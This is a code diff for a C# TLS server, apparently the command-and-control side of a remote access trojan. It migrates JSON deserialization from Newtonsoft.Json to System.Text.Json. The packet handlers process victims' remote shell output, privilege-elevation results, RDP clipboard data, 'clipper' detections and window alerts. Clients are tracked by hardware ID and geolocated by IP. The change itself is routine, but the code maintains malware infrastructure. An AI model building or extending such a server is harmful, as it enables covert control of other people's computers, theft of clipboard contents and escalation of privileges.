@@ -5,7 +5,7 @@ using System.Net.Http;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
-using Newtonsoft.Json;
+using System.Text.Json;
 using SeroServer.Data;
 using SeroServer.Protocol;
 using SeroServer.UI;
@@ -317,7 +317,7 @@ public class TlsServer
             }
 
             ClientInfoData? info;
-            try { info = JsonConvert.DeserializeObject<ClientInfoData>(infoPacket.Data); }
+            try { info = JsonSerializer.Deserialize(infoPacket.Data, ServerJsonContext.Default.ClientInfoData); }
             catch { info = null; }
             if (info == null)
             {
@@ -454,7 +454,7 @@ public class TlsServer
                         break;
 
                     case PacketType.HardwareStats:
-                        var hwStats = JsonConvert.DeserializeObject<HardwareStatsData>(packet.Data);
+                        var hwStats = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.HardwareStatsData);
                         if (hwStats != null)
                         {
                             client.LastHwStatsAt = DateTime.UtcNow;
@@ -468,7 +468,7 @@ public class TlsServer
                         break;
 
                     case PacketType.ClientInfo:
-                        var updated = JsonConvert.DeserializeObject<ClientInfoData>(packet.Data);
+                        var updated = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ClientInfoData);
                         if (updated != null)
                         {
                             client.OS = updated.OS;
@@ -480,7 +480,7 @@ public class TlsServer
                         break;
 
                     case PacketType.ShellOutput:
-                        var shellData = JsonConvert.DeserializeObject<ShellOutputData>(packet.Data);
+                        var shellData = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ShellOutputData);
                         if (shellData != null)
                         {
                             _store.RecordActivity(client.Hwid, $"Shell output (exit={shellData.ExitCode})");
@@ -489,13 +489,13 @@ public class TlsServer
                         break;
 
                     case PacketType.AutoTaskShellOutput:
-                        var atShellData = JsonConvert.DeserializeObject<ShellOutputData>(packet.Data);
+                        var atShellData = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ShellOutputData);
                         if (atShellData != null)
                             AutoTaskShellOutputReceived?.Invoke(client.Id, atShellData.Output);
                         break;
 
                     case PacketType.ElevationResult:
-                        var elevData = JsonConvert.DeserializeObject<ElevationResultData>(packet.Data);
+                        var elevData = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ElevationResultData);
                         if (elevData != null)
                         {
                             _store.RecordActivity(client.Hwid, $"Elevation: {(elevData.Success ? "OK" : "FAILED")} - {elevData.Message}");
@@ -534,7 +534,7 @@ public class TlsServer
                             try { rdpClipH(packet); } catch { }
                         else
                         {
-                            var clipMsg = JsonConvert.DeserializeObject<RdpClipboardData>(packet.Data);
+                            var clipMsg = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.RdpClipboardData);
                             if (clipMsg != null && !string.IsNullOrEmpty(clipMsg.Text))
                                 RdpClipboardReceived?.Invoke(client.Id, clipMsg.Text);
                         }
@@ -548,13 +548,13 @@ public class TlsServer
                         break;
 
                     case PacketType.ClipperDetected:
-                        var clipDet = JsonConvert.DeserializeObject<ClipperDetectedData>(packet.Data);
+                        var clipDet = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.ClipperDetectedData);
                         if (clipDet != null)
                             ClipperDetectedReceived?.Invoke(client.Id, clipDet);
                         break;
 
                     case PacketType.WindowNotifyAlert:
-                        var wnAlert = JsonConvert.DeserializeObject<WindowNotifyAlertData>(packet.Data);
+                        var wnAlert = JsonSerializer.Deserialize(packet.Data, ServerJsonContext.Default.WindowNotifyAlertData);
                         if (wnAlert != null)
                             WindowNotifyAlertReceived?.Invoke(client.Id, wnAlert);
                         break;
@@ -639,7 +639,7 @@ public class TlsServer
             // ip-api.com free plan only supports HTTP (HTTPS requires paid plan)
             var url  = $"http://ip-api.com/json/{ip}?fields=country,countryCode";
             var json = await _http.GetStringAsync(url);
-            var obj  = JsonConvert.DeserializeObject<IpApiResponse>(json);
+            var obj  = JsonSerializer.Deserialize(json, ServerJsonContext.Default.IpApiResponse);
             var country = obj?.country ?? "Unknown";
             var code    = obj?.countryCode ?? "";
             var result  = (country, code);
@@ -674,8 +674,8 @@ public class TlsServer
     }
 }
 
-// Typed response for ip-api.com — replaces DeserializeObject<dynamic>
-file sealed class IpApiResponse
+// Typed response for ip-api.com
+internal sealed class IpApiResponse
 {
     public string? country     { get; set; }
     public string? countryCode { get; set; }
